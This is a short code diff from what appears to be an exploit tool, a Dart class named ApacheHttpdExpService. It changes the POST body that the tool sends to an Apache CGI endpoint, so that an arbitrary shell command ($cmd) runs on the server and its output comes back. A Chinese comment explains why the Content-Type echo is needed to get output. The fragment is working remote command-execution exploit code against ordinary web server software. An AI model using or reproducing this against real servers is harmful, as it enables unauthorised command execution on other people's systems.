@@ -82,7 +82,8 @@ class ApacheHttpdExpService {
           method: 'POST',
           rawPath: rawPath,
           headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-          body: 'echo;$cmd',
+          // CGI 要求输出先有 Content-Type 头，否则 Apache 判定响应非法、返回空体。
+          body: 'echo Content-Type: text/plain; echo; $cmd',
         );
         if (body != null && body.trim().isNotEmpty) return body;
       }
